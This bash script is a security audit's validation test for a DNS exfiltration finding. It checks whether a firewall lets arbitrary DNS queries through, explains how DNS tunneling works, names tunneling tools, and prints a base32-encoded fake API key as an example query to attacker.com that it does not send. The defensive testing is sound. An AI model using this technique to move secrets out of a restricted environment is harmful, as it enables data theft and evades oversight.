#!/usr/bin/env bash
# =============================================================================
# VALIDATION SCRIPT 03: DNS Exfiltration Channel
# =============================================================================
#
# FINDING: HIGH-001 - DNS Exfiltration Channel
# SEVERITY: HIGH
#
# TECHNICAL DETAILS:
# ------------------
# The nftables rules allow all DNS traffic:
#   udp dport 53 accept
#   tcp dport 53 accept
#
# This enables DNS tunneling, where arbitrary data is encoded in DNS queries:
#
# 1. Data is encoded (base32/base64) into subdomain labels
# 2. Query sent: [encoded-data].attacker-domain.com
# 3. Attacker's authoritative DNS server receives and decodes
# 4. Response can carry return data in TXT records
#
# Tools: iodine, dnscat2, dns2tcp
# Bandwidth: Typically 10-50 KB/s, sufficient for credential/code exfil
#
# RISK LEVEL: SAFE TEST
# This script demonstrates the capability by:
# 1. Showing DNS is allowed
# 2. Making a benign DNS query to show arbitrary domains resolve
# We do NOT actually exfiltrate data or contact attacker infrastructure.
#
# EXPECTED RESULT IF VULNERABLE:
# - Can resolve arbitrary external domains
# - Can send DNS queries with arbitrary subdomains
#
# =============================================================================

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo "=============================================="
echo "VALIDATION 03: DNS Exfiltration Channel"
echo "=============================================="
echo ""

VULNERABLE=false

# Test 1: Can we resolve external domains?
echo "[TEST 1] Testing DNS resolution of external domains..."

# Use a variety of domains to test filtering
TEST_DOMAINS=(
    "example.com"          # Should be allowed (neutral)
    "google.com"           # Not in allowlist
    "github.com"           # Not in allowlist
)

for domain in "${TEST_DOMAINS[@]}"; do
    echo -n "  $domain: "

    # Try multiple resolution methods
    RESOLVED=""
    if command -v dig &>/dev/null; then
        RESOLVED=$(dig +short "$domain" A 2>/dev/null | head -1)
    elif command -v getent &>/dev/null; then
        RESOLVED=$(getent ahosts "$domain" 2>/dev/null | head -1 | awk '{print $1}')
    elif command -v host &>/dev/null; then
        RESOLVED=$(host -t A "$domain" 2>/dev/null | grep "has address" | head -1 | awk '{print $NF}')
    fi

    if [[ -n "$RESOLVED" ]]; then
        echo -e "${YELLOW}$RESOLVED${NC}"
        VULNERABLE=true
    else
        echo -e "${GREEN}(blocked or no resolver)${NC}"
    fi
done

# Test 2: Can we query with arbitrary subdomains? (exfil simulation)
echo ""
echo "[TEST 2] Testing arbitrary subdomain queries (exfil vector)..."
echo "  Simulating encoded data in subdomain..."

# This is a SAFE test - we query a known domain with a made-up subdomain
# In a real attack, this subdomain would contain encoded stolen data
EXFIL_SIM="test-$(date +%s).example.com"
echo -n "  Query: $EXFIL_SIM -> "

if command -v dig &>/dev/null; then
    # The query itself is the exfil - attacker sees it in their DNS logs
    RESULT=$(dig +short "$EXFIL_SIM" A 2>/dev/null || echo "")
    if dig +short "$EXFIL_SIM" A &>/dev/null; then
        echo -e "${YELLOW}Query sent successfully${NC}"
        echo -e "${RED}  VULNERABLE: Arbitrary DNS queries allowed${NC}"
        VULNERABLE=true
    else
        echo -e "${GREEN}Query blocked${NC}"
    fi
else
    echo "(dig not available for test)"
fi

# Test 3: Check for DNS tunneling tools
echo ""
echo "[TEST 3] Checking for DNS tunneling tools..."
TUNNEL_TOOLS=("iodine" "dnscat2" "dns2tcp" "dnscat")
FOUND_TOOLS=()

for tool in "${TUNNEL_TOOLS[@]}"; do
    if command -v "$tool" &>/dev/null; then
        FOUND_TOOLS+=("$tool")
    fi
done

if [[ ${#FOUND_TOOLS[@]} -gt 0 ]]; then
    echo -e "${RED}  DNS tunneling tools found: ${FOUND_TOOLS[*]}${NC}"
    VULNERABLE=true
else
    echo -e "${GREEN}  No DNS tunneling tools installed${NC}"
fi

# Test 4: Check resolv.conf for DNS server
echo ""
echo "[TEST 4] Checking DNS configuration..."
if [[ -f /etc/resolv.conf ]]; then
    echo "  /etc/resolv.conf contents:"
    grep -E '^nameserver' /etc/resolv.conf | while read line; do
        echo "    $line"
    done
else
    echo "  No /etc/resolv.conf found"
fi

# Test 5: Demonstrate encoding (how exfil would work)
echo ""
echo "[TEST 5] Demonstrating data encoding for DNS exfil..."
SECRET="API_KEY=sk-ant-secret123"
ENCODED=$(echo -n "$SECRET" | base32 | tr -d '=' | tr '[:upper:]' '[:lower:]')
echo "  Original: $SECRET"
echo "  Encoded:  $ENCODED"
echo "  DNS query would be: ${ENCODED:0:63}.attacker.com"
echo ""
echo "  (We did NOT send this - just showing the technique)"

echo ""
echo "=============================================="
if $VULNERABLE; then
    echo -e "${RED}RESULT: VULNERABLE${NC}"
    echo ""
    echo "DNS queries to arbitrary domains are allowed."
    echo "Data can be exfiltrated via DNS tunneling."
    echo ""
    echo "REMEDIATION:"
    echo "  1. Run local DNS resolver with domain allowlist"
    echo "  2. Only allow queries to specific DNS servers"
    echo "  3. Use /etc/hosts for all allowed domains"
    echo "  4. Block DNS entirely; pre-resolve IPs"
else
    echo -e "${GREEN}RESULT: NOT VULNERABLE${NC}"
    echo ""
    echo "DNS appears to be restricted or unavailable."
fi
echo "=============================================="
